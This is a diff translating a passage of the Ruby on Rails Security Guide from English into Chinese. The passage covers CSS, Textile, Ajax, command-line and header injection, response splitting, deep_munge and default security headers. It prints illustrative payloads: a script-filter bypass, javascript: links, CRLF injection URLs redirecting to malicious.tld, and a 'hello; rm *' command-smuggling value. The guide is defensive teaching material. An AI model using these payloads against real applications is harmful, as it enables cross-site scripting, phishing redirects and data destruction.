-The next problem was MySpace filtering the word "javascript", so the author used "java&lt;NEWLINE&gt;script" to get around this:
+MySpace 会过滤 `javascript` 这个词，所以蠕虫作者使用 `java<NEWLINE>script` 绕过了这个限制：
 
-```html
+{:lang="html"}
+~~~
 <div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
-```
+~~~
 
-Another problem for the worm's author were CSRF security tokens. Without them he couldn't send a friend request over POST. He got around it by sending a GET to the page right before adding a user and parsing the result for the CSRF token.
+蠕虫作者面对的另一个问题是 CSRF 安全权标。没有安全权标就无法通过 POST 请求发送好友请求。蠕虫作者先向页面发起 GET 请求，然后再添加用户，处理 CSRF 权标。
 
-In the end, he got a 4 KB worm, which he injected into his profile page.
+最终，只用 4KB 空间就写好了这个蠕虫，注入到自己的资料页面。
 
-The [moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) CSS property proved to be another way to introduce JavaScript in CSS in Gecko-based browsers (Firefox, for example).
+CSS 中的 [moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) 属性也被证实可在基于 Gecko 的浏览器（例如 Firefox）中把 Javascript 写入 CSS 中。
 
-#### Countermeasures
+#### 对策 {#css-injection-countermeasures}
 
-This example, again, showed that a blacklist filter is never complete. However, as custom CSS in web applications is a quite rare feature, it may be hard to find a good whitelist CSS filter. _If you want to allow custom colors or images, you can allow the user to choose them and build the CSS in the web application_. Use Rails' `sanitize()` method as a model for a whitelist CSS filter, if you really need one.
+这个例子再次证明黑名单不能以偏概全。自定义 CSS 在网页程序中是个很少见的功能，因此我也不知道怎么编写 CSS 白名单过滤器。如果想让用户自定义颜色或图片，可以让用户选择颜色或图片，再由网页程序生成 CSS。如果真的需要 CSS 白名单过滤器，可以使用 Rails 的 `sanitize()` 方法。
 
-### Textile Injection
+### Textile 注入 {#textile-injection}
 
-If you want to provide text formatting other than HTML (due to security), use a mark-up language which is converted to HTML on the server-side. [RedCloth](http://redcloth.org/) is such a language for Ruby, but without precautions, it is also vulnerable to XSS.
+如果想提供 HTML 之外的文本格式化方式（基于安全考虑），可以使用能转换为 HTML 的标记语言。[RedCloth](http://redcloth.org/) 就是一种使用 Ruby 编写的转换工具。使用前要注意，RedCloth 也有跨站脚本漏洞。
 
-For example, RedCloth translates `_test_` to &lt;em&gt;test&lt;em&gt;, which makes the text italic. However, up to the current version 3.0.4, it is still vulnerable to XSS. Get the [all-new version 4](http://www.redcloth.org) that removed serious bugs. However, even that version has [some security bugs](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html), so the countermeasures still apply. Here is an example for version 3.0.4:
+例如，RedCloth 会把 `_test_` 转换成 `<em>test</em>`，斜体显示文字。不过到最新的 3.0.4 版本，仍然有跨站脚本漏洞。请安装已经解决安全问题的[全新第 4 版](http://www.redcloth.org)。可是这个版本还有[一些安全隐患](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html)。下面的例子针对 V3.0.4：
 
-```ruby
+{:lang="ruby"}
+~~~
 RedCloth.new('<script>alert(1)</script>').to_html
 # => "<script>alert(1)</script>"
-```
+~~~
 
-Use the :filter_html option to remove HTML which was not created by the Textile processor.
+使用 `:filter_html` 选项可以过滤不是由 RedCloth 生成的 HTML：
 
-```ruby
+{:lang="ruby"}
+~~~
 RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
 # => "alert(1)"
-```
+~~~
 
-However, this does not filter all HTML, a few tags will be left (by design), for example &lt;a&gt;:
+不过，这个选项不能过滤全部的 HTML，会留下一些标签（程序就是这样设计的），例如 `<a>`：
 
-```ruby
+{:lang="ruby"}
+~~~
 RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
 # => "<p><a href="javascript:alert(1)">hello</a></p>"
-```
+~~~
 
-#### Countermeasures
+#### 对策 {#textile-injection-countermeasures}
 
-It is recommended to _use RedCloth in combination with a whitelist input filter_, as described in the countermeasures against XSS section.
+建议使用 RedCloth 时要同时使用白名单过滤输入值，这一点在应对跨站脚本攻击时已经说过。
 
-### Ajax Injection
+### Ajax 注入 {#ajax-injection}
 
-NOTE: _The same security precautions have to be taken for Ajax actions as for "normal" ones. There is at least one exception, however: The output has to be escaped in the controller already, if the action doesn't render a view._
+I> 在常规动作上运用的安全预防措施在 Ajax 动作上也要使用。不过有一个例外：如果动作不渲染视图，在控制器中就要做好转义。
 
-If you use the [in_place_editor plugin](http://dev.rubyonrails.org/browser/plugins/in_place_editing), or actions that return a string, rather than rendering a view, _you have to escape the return value in the action_. Otherwise, if the return value contains a XSS string, the malicious code will be executed upon return to the browser. Escape any input value using the h() method.
+如果使用 [in_place_editor](http://dev.rubyonrails.org/browser/plugins/in_place_editing) 插件，或者动作不渲染视图只返回字符串，就要在动作中转义返回值。否则，如果返回值中包含跨站脚本，发送到浏览器时就会执行。请使用 `h()` 方法转义所有输入值。
 
-### Command Line Injection
+### 命令行注入 {#command-line-injection}
 
-NOTE: _Use user-supplied command line parameters with caution._
+I> 使用用户输入的命令行参数时要小心。
 
-If your application has to execute commands in the underlying operating system, there are several methods in Ruby: exec(command), syscall(command), system(command) and `command`. You will have to be especially careful with these functions if the user may enter the whole command, or a part of it. This is because in most shells, you can execute another command at the end of the first one, concatenating them with a semicolon (;) or a vertical bar (|).
+如果程序要在操作系统层面执行命令，可以使用 Ruby 提供的几个方法：`exec(command)`，`syscall(command)`，`system(command)` 和 `command`。如果用户可以输入整个命令，或者命令的一部分，这时就要特别注意。因为在大多数 shell 中，两个命令可以写在一起，使用分号（`;`）或者竖线（`|`）连接。
 
-A countermeasure is to _use the `system(command, parameters)` method which passes command line parameters safely_.
+为了避免这类问题，可以使用 `system(command, parameters)` 方法，这样传入的命令行参数更安全。
 
-```ruby
+{:lang="ruby"}
+~~~
 system("/bin/echo","hello; rm *")
 # prints "hello; rm *" and does not delete files
-```
+~~~
 
+### 报头注入 {#header-injection}
 
-### Header Injection
+W> HTTP 报头是动态生成的，某些情况下可能会包含用户注入的值，导致恶意重定向、跨站脚本或者 HTTP 响应拆分（HTTP response splitting）。
 
-WARNING: _HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS or HTTP response splitting._
+HTTP 请求报头中包含 `Referer`，`User-Agent`（客户端软件）和 `Cookie` 等字段。响应报头中包含状态码，`Cookie` 和 `Location`（重定向的目标 URL）等字段。这些字段都由用户提供，可以轻易修改。记住，报头也要转义。例如，在管理页面中显示 `User-Agent` 时。
 
-HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. _Remember to escape these header fields, too._ For example when you display the user agent in an administration area.
+除此之外，基于用户输入值构建响应报头时还要格外小心。例如，把用户重定向到指定的页面。重定向时需要在表单中加入 `referer` 字段：
 
-Besides that, it is _important to know what you are doing when building response headers partly based on user input._ For example you want to redirect the user back to a specific page. To do that you introduced a "referer" field in a form to redirect to the given address:
-
-```ruby
+{:lang="ruby"}
+~~~
 redirect_to params[:referer]
-```
+~~~
 
-What happens is that Rails puts the string into the Location header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:
+Rails 会把这个字段的值提供给 `Location` 报头，并向浏览器发送 302（重定向）状态码。恶意用户可以做的第一件事是：
 
-```
+~~~
 http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
-```
+~~~
 
-And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:
+Rails 2.1.2 之前有个漏洞，黑客可以注入任意的报头字段，例如：
 
-```
+~~~
 http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
 http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
-```
+~~~
 
-Note that "%0d%0a" is URL-encoded for "\r\n" which is a carriage-return and line-feed (CRLF) in Ruby. So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.
+注意，`%0d%0a` 是编码后的 `\r\n`，在 Ruby 中表示回车换行（CRLF）。上面的例子得到的 HTTP 报头如下所示，第二个 `Location` 覆盖了第一个：
 
-```
+~~~
 HTTP/1.1 302 Moved Temporarily
 (...)
 Location: http://www.malicious.tld
-```
+~~~
 
-So _attack vectors for Header Injection are based on the injection of CRLF characters in a header field._ And what could an attacker do with a false redirection? They could redirect to a phishing site that looks the same as yours, but ask to login again (and sends the login credentials to the attacker). Or they could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the `redirect_to` method. _Make sure you do it yourself when you build other header fields with user input._
+报头注入就是在报头中注入 CRLF 字符。那么攻击者是怎么进行恶意重定向的呢？攻击者可以把用户重定向到钓鱼网站，要求再次登录，把登录密令发送给攻击者。或者可以利用浏览器的安全漏洞在网站中安装恶意软件。Rails 2.1.2 在 `redirect_to` 方法中转义了传给 `Location` 报头的值。使用用户的输入值构建报头时要手动进行转义。
 
-#### Response Splitting
+#### 响应拆分 {#response-splitting}
 
-If Header Injection was possible, Response Splitting might be, too. In HTTP, the header block is followed by two CRLFs and the actual data (usually HTML). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious HTML. The response will be:
+既然报头注入有可能发生，响应拆分也有可能发生。在 HTTP 响应中，报头后面跟着两个 CRLF，然后是真正的数据（HTML）。响应拆分的原理是在报头中插入两个 CRLF，后跟其他的响应，包含恶意 HTML。响应拆分示例：
 
-```
+~~~
 HTTP/1.1 302 Found [First standard 302 response]
 Date: Tue, 12 Apr 2005 22:09:07 GMT
 Location: Content-Type: text/html
@@ -917,40 +958,29 @@ Keep-Alive: timeout=15, max=100         shown as the redirected page]
 Connection: Keep-Alive
 Transfer-Encoding: chunked
 Content-Type: text/html
-```
+~~~
 
-Under certain circumstances this would present the malicious HTML to the victim. However, this only seems to work with Keep-Alive connections (and many browsers are using one-time connections). But you can't rely on this. _In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks._
+某些情况下，拆分后的响应会把恶意 HTML 显示给用户。不过这只会在 `Keep-Alive` 连接中发生，大多数浏览器都使用一次性连接。但你不能依赖这一点。不管怎样这都是个严重的隐患，你需要升级到 Rails 最新版，消除报头注入风险（因此也就避免了响应拆分）。
 
-Unsafe Query Generation
------------------------
+## 生成的不安全查询 {#unsafe-query-generation}
 
-Due to the way Active Record interprets parameters in combination with the way
-that Rack parses query parameters it was possible to issue unexpected database
-queries with `IS NULL` where clauses. As a response to that security issue
-([CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ),
-[CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ)
-and [CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ))
-`deep_munge` method was introduced as a solution to keep Rails secure by default.
+根据 Active Record 处理参数的方式以及 Rack 解析请求参数的方式，攻击者可以通过 `WHERE IS NULL` 子句发起异常数据库查询。为了应对这种安全隐患（[CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ)，[CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ) 和 [CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ)），Rails 加入了 `deep_munge` 方法，增加安全性。
 
-Example of vulnerable code that could be used by attacker, if `deep_munge`
-wasn't performed is:
+如果不使用 `deep_munge` 方法，下面的代码有被攻击的风险：
 
-```ruby
+{:lang="ruby"}
+~~~
 unless params[:token].nil?
   user = User.find_by_token(params[:token])
   user.reset_password!
 end
-```
+~~~
 
-When `params[:token]` is one of: `[]`, `[nil]`, `[nil, nil, ...]` or
-`['foo', nil]` it will bypass the test for `nil`, but `IS NULL` or
-`IN ('foo', NULL)` where clauses still will be added to the SQL query.
+如果 `params[:token]` 的值是 `[]`、`[nil]`、`[nil, nil, ...]` 或 `['foo', nil]` 之一，会跳过 `nil?` 检查，但 `WHERE` 子句 `IS NULL` 或 `IN ('foo', NULL)` 还是会添加到 SQL 查询中。
 
-To keep rails secure by default, `deep_munge` replaces some of the values with
-`nil`. Below table shows what the parameters look like based on `JSON` sent in
-request:
+为了保证 Rails 的安全性，`deep_munge` 方法会把某些值替换成 `nil`。下表显示在请求中发送 JSON 格式数据时得到的参数：
 
-| JSON                              | Parameters               |
+| JSON                              | 参数                     |
 |-----------------------------------|--------------------------|
 | `{ "person": null }`              | `{ :person => nil }`     |
 | `{ "person": [] }`                | `{ :person => nil }`     |
@@ -958,67 +988,61 @@ request:
 | `{ "person": [null, null, ...] }` | `{ :person => nil }`     |
 | `{ "person": ["foo", null] }`     | `{ :person => ["foo"] }` |
 
-It is possible to return to old behaviour and disable `deep_munge` configuring
-your application if you are aware of the risk and know how to handle it:
+如果知道这种风险，也知道如何处理，可以通过设置禁用 `deep_munge`，使用原来的处理方式：
 
-```ruby
+{:lang="ruby"}
+~~~
 config.action_dispatch.perform_deep_munge = false
-```
+~~~
 
-Default Headers
----------------
+## 默认报头 {#default-headers}
 
-Every HTTP response from your Rails application receives the following default security headers.
+Rails 程序返回的每个 HTTP 响应都包含下面这些默认的安全报头：
 
-```ruby
+{:lang="ruby"}
+~~~
 config.action_dispatch.default_headers = {
   'X-Frame-Options' => 'SAMEORIGIN',
   'X-XSS-Protection' => '1; mode=block',
   'X-Content-Type-Options' => 'nosniff'
 }
-```
+~~~
 
-You can configure default headers in `config/application.rb`.
+默认的报头可在文件 `config/application.rb` 中设置：
 
-```ruby
+{:lang="ruby"}
+~~~
 config.action_dispatch.default_headers = {
   'Header-Name' => 'Header-Value',
   'X-Frame-Options' => 'DENY'
 }
-```
+~~~
 
-Or you can remove them.
+当然也可删除默认报头：
 
-```ruby
+{:lang="ruby"}
+~~~
 config.action_dispatch.default_headers.clear
-```
+~~~
 
-Here is a list of common headers:
+下面是一些常用的报头：
 
-* X-Frame-Options
-_'SAMEORIGIN' in Rails by default_ - allow framing on same domain. Set it to 'DENY' to deny framing at all or 'ALLOWALL' if you want to allow framing for all website.
-* X-XSS-Protection
-_'1; mode=block' in Rails by default_ - use XSS Auditor and block page if XSS attack is detected. Set it to '0;' if you want to switch XSS Auditor off(useful if response contents scripts from request parameters)
-* X-Content-Type-Options
-_'nosniff' in Rails by default_ - stops the browser from guessing the MIME type of a file.
-* X-Content-Security-Policy
-[A powerful mechanism for controlling which sites certain content types can be loaded from](http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html)
-* Access-Control-Allow-Origin
-Used to control which sites are allowed to bypass same origin policies and send cross-origin requests.
-* Strict-Transport-Security
-[Used to control if the browser is allowed to only access a site over a secure connection](http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)
+* `X-Frame-Options`：Rails 中的默认值是 `SAMEORIGIN`，允许使用同域中的 iframe。设为 `DENY` 可以完全禁止使用 iframe。如果允许使用所有网站的 iframe，可以设为 `ALLOWALL`。
+* `X-XSS-Protection`：Rails 中的默认值是 `1; mode=block`，使用跨站脚本审查程序，如果发现跨站脚本攻击就不显示网页。如果想关闭跨站脚本审查程序，可以设为 `0;`（如果响应中包含请求参数中传入的脚本）。
+* `X-Content-Type-Options`：Rails 中的默认值是 `nosniff`，禁止浏览器猜测文件的 MIME 类型。
+* `X-Content-Security-Policy`：一种[强大的机制](http://dvcs.w3.org/hg/content-security-policy/raw-file/tip/csp-specification.dev.html)，控制可以从哪些网站加载特定类型的内容。
+* `Access-Control-Allow-Origin`：设置哪些网站可以不沿用同源原则，发送跨域请求。
+* `Strict-Transport-Security`：设置是否强制浏览器使用[安全连接](http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)访问网站。
 
-Environmental Security
-----------------------
+## 环境相关的安全问题 {#environmental-security}
 
-It is beyond the scope of this guide to inform you on how to secure your application code and environments. However, please secure your database configuration, e.g. `config/database.yml`, and your server-side secret, e.g. stored in `config/secrets.yml`. You may want to further restrict access, using environment-specific versions of these files and any others that may contain sensitive information.
+增加程序代码和环境安全性的话题已经超出了本文范围。但记住要保护好数据库设置（`config/database.yml`）以及服务器端密令（`config/secrets.yml`）。更进一步，为了安全，这两个文件以及其他包含敏感数据的文件还可使用环境专用版本。
 
-Additional Resources
---------------------
+## 其他资源 {#additional-resources}
 
-The security landscape shifts and it is important to keep up to date, because missing a new vulnerability can be catastrophic. You can find additional resources about (Rails) security here:
+安全漏洞层出不穷，所以一定要了解最新信息，新的安全漏洞可能会导致灾难性的后果。安全相关的信息可从下面的网站获取：
 
-* The Ruby on Rails security project posts security news regularly: [http://www.rorsecurity.info](http://www.rorsecurity.info)
-* Subscribe to the Rails security [mailing list](http://groups.google.com/group/rubyonrails-security)
-* [Keep up to date on the other application layers](http://secunia.com/) (they have a weekly newsletter, too)
-* A [good security blog](http://ha.ckers.org/blog/) including the [Cross-Site scripting Cheat Sheet](http://ha.ckers.org/xss.html)
+* Ruby on Rails 安全项目，经常会发布安全相关的新闻：<http://www.rorsecurity.info>；
+* 订阅 Rails [安全邮件列表](http://groups.google.com/group/rubyonrails-security)；
+* [时刻关注程序所用组件的安全问题](http://secunia.com/)（还有周报）；
+* [优秀的安全博客](http://ha.ckers.org/blog/)，包含一个[跨站脚本速查表](http://ha.ckers.org/xss.html)；
